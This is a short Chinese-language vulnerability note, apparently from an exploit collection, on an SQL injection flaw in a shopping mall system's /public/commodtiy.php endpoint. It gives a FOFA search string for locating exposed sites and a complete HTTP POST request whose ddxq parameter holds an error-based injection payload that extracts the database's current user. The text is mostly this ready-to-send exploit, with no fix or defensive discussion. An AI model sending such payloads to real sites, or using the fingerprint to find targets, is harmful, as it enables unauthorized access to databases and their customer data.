## 购物商城系统commodtiy存在任意SQL注入漏洞
 购物商城系统commodtiy存在任意SQL注入漏洞

## fofa
```plain
"/public/gwc.php"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1715270637996-7f6f5141-b58d-4ecc-af15-6b309fb958a3.png)

## 三、漏洞复现
```http
POST /public/commodtiy.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

ddxq='||(SELECT 0x4776756d WHERE 3443=3443 AND (SELECT 9303 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```



![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731861954485-5da4b05c-698c-40e1-a7d4-7819586d55df.png)

